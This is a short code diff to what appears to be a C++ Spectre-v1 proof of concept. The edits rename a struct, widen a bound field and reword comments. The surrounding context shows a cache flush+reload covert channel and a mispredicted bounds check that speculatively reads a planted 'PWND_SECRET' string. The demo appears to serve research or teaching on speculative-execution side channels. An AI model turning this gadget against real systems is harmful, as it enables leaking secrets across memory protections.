@@ -27,12 +27,10 @@ alignas(PAGE_SZ) const char* secret_space = "ABCDEFGHIJKLMNOPQRSTUVWXYZ_";
 int secret_space_length = 0;
 
 #define ACCESS_BOUND 4
-alignas(PAGE_SZ) struct SecretStruct {
+alignas(PAGE_SZ) struct {
     u8 values[ACCESS_BOUND] = {1, 2, 3, 4};     // `get_value` doesn't guard this.
     char secret[128] = "PWND_SECRET";           // `get_value` does (well, should!) guard this.
-
-    // Bound checks must retrieve the bound from memory for flush-reload to work.
-    volatile u8 NVALUES = ACCESS_BOUND;
+    volatile u32 NVALUES = ACCESS_BOUND;        // Bound checks must retrieve the bound from memory.
 } DATA;
 
 [[gnu::noinline]] u8 get_value(int idx, u8* covert) {
@@ -76,8 +74,8 @@ char recover_byte(int byte_idx, u8* covert, int threshold, int hit_threshold, in
             _mm_clflush(&covert[PAGE_SZ * (u8)secret_space[i]]);
         }
 
-        // Malign access. `byte_idx` > 4 is out of bounds. The misprediction speculatively
-        // reads `DATA.secret` through the covert channel.
+        // Malicious access. `byte_idx` > 4 is out of bounds. The misprediction
+        // speculatively reads `DATA.secret` through the covert channel.
         _mm_lfence();
         sum += get_value(byte_idx, covert);
 
